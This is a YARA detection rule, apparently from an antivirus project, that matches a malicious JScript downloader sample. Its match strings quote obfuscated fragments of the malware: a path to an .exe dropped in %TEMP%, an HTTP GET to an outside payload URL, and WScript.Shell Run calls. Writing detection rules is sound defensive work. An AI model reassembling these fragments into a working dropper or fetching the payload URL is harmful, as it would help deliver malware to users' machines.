rule sig_20160328_faac6019b4672c4df9c2d61665ea2f32 {
  meta:
    description = "datamaliciousorder - file 20160328_faac6019b4672c4df9c2d61665ea2f32.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e01118142c33ed5419b4b2a23fec35705b8b3bf553c89487148b3c19c587a953"

  strings:
    $s1  = "function Hfrzex() {return Tzgth[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"n7G3Z02u.exe\";};" fullword ascii
    $s2  = "do {WScript[Jfjou](Efqfm() * 11)} while (Eqcnc[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Zvgewrwme(Xxpnrczpap, Yxzemvebj){return Xxpnrczpap - Yxzemvebj;};" fullword ascii
    $s4  = "Eqcnc[Wkmqjhuoz](\"GET\", \"http://www.creative-drumschool.de/p3isakd\", false);" fullword ascii
    $s5  = "var Tzgth = function Fgowugbe() {return WScript[Hrhrngw](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Snadsnigl(Cuzmressfd){Tzgth[\"Run\"](Cuzmressfd, Acvqexh, Acvqexh);};" fullword ascii
    $s7  = "function Onapojvv() {return ((Ngnmjnrz == true) && (Ngnmjnrz == Naanr)) ? 1 : Acvqexh;};" fullword ascii
    $s8  = "var Hhuff = false;" fullword ascii
    $s9  = "return Zvgewrwme(Ptktfbbt, Czuecgxmxr);" fullword ascii
    $s10 = "function Bzxwigadxj(){return Hrhrngw;};" fullword ascii
    $s11 = "function Mczsuwg()" fullword ascii
    $s12 = "function Ujzmuyaht(Peonexboig) {var Xyhut = (1, 2, 3, 4, 5, Peonexboig); return Xyhut;};" fullword ascii
    $s13 = "function Tejdob(){return Zfuplij;};" fullword ascii
    $s14 = "var Ngnmjnrz = false;" fullword ascii
    $s15 = "var Mwozhgj = new this[\"Date\"]();" fullword ascii
    $s16 = "Ngnmjnrz = true; " fullword ascii
    $s17 = " while (Buhgob){" fullword ascii
    $s18 = "function Efqfm(){return 22;};" fullword ascii
    $s19 = "Naanr = true; " fullword ascii
    $s20 = "var Naanr = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}